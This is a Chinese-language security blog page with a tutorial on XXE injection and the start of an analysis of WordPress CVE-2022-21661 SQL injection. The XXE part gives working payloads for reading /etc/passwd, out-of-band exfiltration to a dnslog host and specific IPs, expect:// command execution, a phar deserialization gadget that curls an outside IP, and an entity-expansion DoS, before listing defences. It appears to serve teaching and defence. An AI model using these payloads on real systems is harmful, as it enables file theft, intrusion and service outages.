<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.2"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-XXE外部实体注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-08-10T07:31:26.000Z" itemprop="datePublished">2022-08-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XXE外部实体注入漏洞"><a href="#XXE外部实体注入漏洞" class="headerlink" title="XXE外部实体注入漏洞"></a>XXE外部实体注入漏洞</h1><h2 id="一、XML格式解析"><a href="#一、XML格式解析" class="headerlink" title="一、XML格式解析"></a>一、XML格式解析</h2><p><code>XML</code>是一种非常流行的标记语言，它通常应用于配置文件。<code>XML</code>文档有自己的格式规范，它由<code>DTD(Document Type Definition)</code>进行控制。</p>
<p><code>DTD</code>可以包含在<code>XML</code>源文件中，也可以包含在其他文件中，通常定义的方式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ELEMENT note (to,from)&gt;</span><br><span class="line">	&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;m1sn0w&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;m1sn0w&lt;/from&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<p><code>ELEMENT</code>用于定义元素，上面表示定义了元素的子元素以及各个元素的类型。</p>
<p>元素的类型主要有两种，一种是<code>#PCDATA</code>，另外一种是<code>#CDATA</code>，两种的区别是前者会进行解析文本，展开实体检查标记，后者表示纯当作字符串进行处理。类比常见的高级语言编程，双引号里面会解析变量，而单引号里面会被直接当成字符串。</p>
<p>如果需要包含外部的<code>DTD</code>，格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYE note SYSTEM &quot;external.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;m1sn0w&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;m1sn0w&lt;/from&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># external.dtd文件内容如下：</span><br><span class="line">&lt;!ELEMENT note (to,from)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<p>简单理解一下，就是将内部引入的<code>[]</code>中的内容替换成了<code>SYSTEM &quot;external.dtd&quot;</code>中的内容。</p>
<p>对于<code>XXE</code>漏洞来说，关键部分就是实体声明部分。实体的定义，即<code>用于定义引用普通文本或特殊字符的快捷方式的变量</code>，也就是说，实体是一个变量。分为内部实体和外部实体：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 内部实体</span><br><span class="line">&lt;!ENTITY element &quot;m1sn0w&quot;&gt;</span><br><span class="line">&lt;a&gt;&amp;element;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>当需要在标签中进行引用实体的时候，需要用到<code>&amp;+实体名+；</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 外部实体</span><br><span class="line">&lt;!ENTITY element SYSTEM &quot;http://xxx/1.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>除了上述的实体引入外，还可以使用参数实体，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % element SYSTEM &quot;http://xxx/1.dtd&quot;&gt;</span><br><span class="line">&lt;a&gt;%element;&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<h2 id="二、外部实体注入"><a href="#二、外部实体注入" class="headerlink" title="二、外部实体注入"></a>二、外部实体注入</h2><p><code>XXE</code>漏洞主要利用的就是引入外部实体的方式，<code>XML</code>协议的支持如下：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220104209699.png" alt="image-20211220104209699"></p>
<h3 id="1、任意文件读取"><a href="#1、任意文件读取" class="headerlink" title="1、任意文件读取"></a>1、任意文件读取</h3><h4 id="（1）有回显的读取敏感文件"><a href="#（1）有回显的读取敏感文件" class="headerlink" title="（1）有回显的读取敏感文件"></a>（1）有回显的读取敏感文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-16&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE m1sn0w [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;file:///etc/passswd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;m1sn0w&gt;&amp;file;&lt;/m1sn0w&gt;</span><br></pre></td></tr></table></figure>

<p>​    在某些情况下，一些敏感文件中含有一些特殊的字符，例如<code>&gt;</code>，<code>&lt;</code>，<code>&amp;</code>等，这个时候如果直接对其进行外部引用，可能会导致<code>XML</code>解析出错，为了避免这种情况，可以使用<code>CDATA</code>，也就是将引用的外部文件都只当成字符串，而不去解析运行，这样就可以达到文件读取的目的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 通常CDATA数据的格式为：</span><br><span class="line">&lt;![CDATA[&quot;xxxxxx&quot;]]&gt;</span><br><span class="line"></span><br><span class="line"># 敏感文件读取payload</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE m1sn0w [</span><br><span class="line">	&lt;!ENTITY % a &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % b SYSTEM &quot;file:///file&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % c &quot;]]&gt;&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % d SYSTEM &quot;http://ip/a.dtd&quot;&gt;</span><br><span class="line">	%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;m1sn0w&gt;&amp;all;&lt;/m1sn0w&gt;</span><br><span class="line"></span><br><span class="line"># a.dtd文件内容为</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%a;%b;%c;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这里主要是有一个拼接，利用<code>CDATA</code>来获取字符串，再次加载到本地<code>DTD</code>中，然后进行一个引用。</p>
<h4 id="（2）无回显读取本地敏感文件"><a href="#（2）无回显读取本地敏感文件" class="headerlink" title="（2）无回显读取本地敏感文件"></a>（2）无回显读取本地敏感文件</h4><p>​    在某些情况下，可能我们可以加载外部实体，但是页面没有回显。此时想要读取文件内容，有一个方法就是将数据外带。利用<code>XXE</code>向外部发送请求，同时将读取到的内容发送至远程服务端。</p>
<p>​    但由于在同一个<code>xml</code>文件中，在内部实体定义中去引用另外一个参数实体是不允许的，也就是下面这种情况：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http://148.70.205.134:8080/%file;&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>​    采用嵌套的方式也是不允许的，因为在实体定义中不允许使用参数实体。（和上面的原理相同）</p>
<p>​    因此在这种情况下，我们可以考虑利用远程加载的方式，来构造实体，从而将数据外带。我们在自己的服务器上创建一个<code>evil.dtd</code>文件，文件内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://rpiyhq.dnslog.cn/?%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>​    然后我在存在<code>XXE</code>漏洞的地方构造如下<code>Payload</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http://101.37.118.41/test.dtd&quot;&gt;</span><br><span class="line">	%remote;</span><br><span class="line">	%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;m1sn0w&lt;/name&gt;</span><br><span class="line">&lt;tel&gt;18888888888&lt;/tel&gt;</span><br><span class="line">&lt;email&gt;&amp;send;&lt;/email&gt;</span><br><span class="line">&lt;password&gt;qwe123&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>​    然后就可以收到发送出去的请求数据，这样也就将读取的文件外带出去了。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220103322811.png" alt="image-20211220103322811"></p>
<h3 id="2、内网端口探测"><a href="#2、内网端口探测" class="headerlink" title="2、内网端口探测"></a>2、内网端口探测</h3><p>​    由于<code>XML</code>支持<code>http</code>协议，可以利用此方式去探测内网开启的端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;http://127.0.0.1:80&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>​    根据页面的返回时间，就可以判断哪些端口开放了，哪些端口关闭了。</p>
<h3 id="3、远程命令执行"><a href="#3、远程命令执行" class="headerlink" title="3、远程命令执行"></a>3、远程命令执行</h3><p>​    在某些特殊情况下，利用<code>XXE</code>漏洞，也可以进行远程命令执行。比如我们需要开启<code> PHP expect</code>模块，通过加载该模块来进行<code>RCE</code>，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;expect://whoami&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;m1sn0w&lt;/name&gt;</span><br><span class="line">&lt;tel&gt;18888888888&lt;/tel&gt;</span><br><span class="line">&lt;email&gt;&amp;file;&lt;/email&gt;</span><br><span class="line">&lt;password&gt;qwe123&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220105105341.png" alt="image-20211220105105341"></p>
<h3 id="4、反序列化漏洞利用"><a href="#4、反序列化漏洞利用" class="headerlink" title="4、反序列化漏洞利用"></a>4、反序列化漏洞利用</h3><p>​    由于在<code>php</code>环境下，<code>XML</code>支持了<code>phar</code>协议，那么有没有可能存在反序列化漏洞呢？我在本地做了一个尝试，构造一个类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class target&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system(&#x27;curl http://148.70.205.134:8080/phar&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    然后我们利用如下代码生成一个<code>phar</code>文件，将其上传至目标服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class target&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo 123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">$o = new target();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    然后在存在<code>XXE</code>漏洞的地方利用<code>phar</code>协议，去包含这个文件。可以发现最后执行了<code>system</code>命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;phar:///app/phar.phar&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;m1sn0w&lt;/name&gt;</span><br><span class="line">&lt;tel&gt;18888888888&lt;/tel&gt;</span><br><span class="line">&lt;email&gt;&amp;file;&lt;/email&gt;</span><br><span class="line">&lt;password&gt;qwe123&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220111834742.png" alt="image-20211220111834742"></p>
<h3 id="5、发起SSRF攻击"><a href="#5、发起SSRF攻击" class="headerlink" title="5、发起SSRF攻击"></a>5、发起<code>SSRF</code>攻击</h3><p>​        该攻击的利用方式和内网端口探测的方式一样，只不过可以让服务器去发送<code>payload</code>请求。对于一些只需要<code>GET</code>方法就可以触发的漏洞，我们可以利用<code>XXE</code>发起<code>SSRF</code>攻击从而完成漏洞利用。</p>
<h3 id="6、DDOS攻击"><a href="#6、DDOS攻击" class="headerlink" title="6、DDOS攻击"></a>6、<code>DDOS</code>攻击</h3><p>​    前面在介绍无回显读取本地敏感文件的时候，有提到过，实体的定义中不能使用参数实体，但是我们可以包含这样的实体<code>$nane;</code>，因此可以利用这样的方式去构造一个<code>payload</code>，不断的消耗服务器的资源：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;data&gt;&amp;a4;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>​    这样不断地迭代，最后的数据量会特别大，从而导致了目标服务器的资源被耗尽，也就到了<code>DDOS</code>攻击的目的。</p>
<h2 id="三、XXE漏洞防御"><a href="#三、XXE漏洞防御" class="headerlink" title="三、XXE漏洞防御"></a>三、<code>XXE</code>漏洞防御</h2><ol>
<li>从开发语言的角度来进行配置，禁用外部实体的引入：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"> </span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"> </span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>对用户提交的数据进行一个简单的过滤，例如<code>ENTITY</code>字段等。</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl8h223i10006b3dp92bhbdx0" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-WordPress SQL注入漏洞（CVE-2022-21661分析与复现）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/" class="article-date">
  <time datetime="2022-06-04T14:23:06.000Z" itemprop="datePublished">2022-06-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="WordPress-SQL注入漏洞（CVE-2022-21661分析与复现）"><a href="#WordPress-SQL注入漏洞（CVE-2022-21661分析与复现）" class="headerlink" title="WordPress SQL注入漏洞（CVE-2022-21661分析与复现）"></a><code>WordPress SQL</code>注入漏洞（<code>CVE-2022-21661</code>分析与复现）</h1><h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><p>​    <code>WordPress</code>是一个用<code>PHP</code>编写的免费开源内容管理系统，由于<code>clean_query</code>函数的校验不当，导致了可能通过插件或主题以某种方式从而触发<code>SQL</code>注入的情况。这已经在<code>WordPress5.8.3</code>中进行了修复。影响版本可以追溯到<code>3.7.37</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WordPress is a free and open-source content management system written in PHP and paired with a MariaDB database. Due to improper sanitization in WP_Query, there can be cases where SQL injection is possible through plugins or themes that use it in a certain way. This has been patched in WordPress version 5.8.3. Older affected versions are also fixed via security release, that go back till 3.7.37. We strongly recommend that you keep auto-updates enabled. There are no known workarounds for this vulnerability. </span><br></pre></td></tr></table></figure>

<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><p>​    在分析整个漏洞之前，首先可以看一下如果想要触发该漏洞，漏洞代码应该是什么样子的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new WP_Query($_POST[&#x27;query_vars&#x27;])</span><br></pre></td></tr></table></figure>

<p>​    这也就是说，传入<code>WP_Query</code>的参数如果可控的话，就可以利用该漏洞。接下来我们看看整个漏洞的利用调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WP_Query::__construct</span><br><span class="line">	WP_Query::query</span><br><span class="line">		WP_Query::get_posts</span><br><span class="line">			WP_Tax_Query::get_sql</span><br><span class="line">				WP_Tax_Query::get_sql_clauses</span><br><span class="line">					WP_Tax_Query::get_sql_for_query</span><br><span class="line">						WP_Tax_Query::get_sql_for_clause</span><br><span class="line">							WP_Tax_Query::clean_query</span><br></pre></td></tr></table></figure>

<p>​    根据官方的修复代码，最后的漏洞点位于<code>WP_Tax_Query</code>的<code>clean_query</code>方法：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114152416687.png" alt="image-20220114152416687"></p>
<p>​    根据漏洞的描述，我们知道的是<code>WP_Tax_Query::clean_query</code>函数对变量没有做严格的校验，最终导致了<code>SQL</code>语句的拼接，进而导致了<code>SQL</code>注入漏洞。</p>
<p>​    通过上下文的分析，我们将注意放置在<code>WP_Tax_Query::get_sql_for_clause</code>这个函数上面，这也是整个漏洞利用调用链中的一个函数；在这个函数中，使用到了<code>clean_query</code>方法对传入的参数进行了校验过滤处理：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119150910580.png" alt="image-20220119150910580"></p>
<p>​    继续查看该方法下面的代码，我们可以知道<code>items</code>变量最终拼接到了<code>SQL</code>语句中。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119151106683.png" alt="image-20220119151106683"></p>
<p>​    该漏洞最终需要利用的就是这个<code>items</code>变量，如果能够控制这个变量的值的话，就可以导致注入。</p>
<p>​    知道了漏洞点的位置，现在我们正向去分析一下。首先我们知道漏洞代码是这个样子的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new WP_Query($_POST[&#x27;query_vars&#x27;])</span><br></pre></td></tr></table></figure>

<p>​    跟进到<code>WP_Query</code>对象的构造方法，知道其调用了<code>query</code>方法。在<code>WP_Query::query</code>中，调用了<code>wp_parse_args</code>函数对输入的字符串进行了处理：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function wp_parse_args( $args, $defaults = array() ) &#123;</span><br><span class="line">	if ( is_object( $args ) ) &#123;</span><br><span class="line">		$parsed_args = get_object_vars( $args );</span><br><span class="line">	&#125; elseif ( is_array( $args ) ) &#123;</span><br><span class="line">		$parsed_args =&amp; $args;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		wp_parse_str( $args, $parsed_args );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if ( is_array( $defaults ) &amp;&amp; $defaults ) &#123;</span><br><span class="line">		return array_merge( $defaults, $parsed_args );</span><br><span class="line">	&#125;</span><br><span class="line">	return $parsed_args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这里主要关注前面两个点，一个是如果传入的是一个对象的话，将其属性名和值取出来转变成数组；如果直接传入的是数组的话，也就是直接返回了。这里也就确定<code>$this-&gt;query_vars</code>和<code>$this-&gt;query</code>变量可控了。</p>
<p>​    接下来调用<code>get_posts</code>方法，该方法的代码比较长，我们直接定位到利用链函数：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114160043348.png" alt="image-20220114160043348"></p>
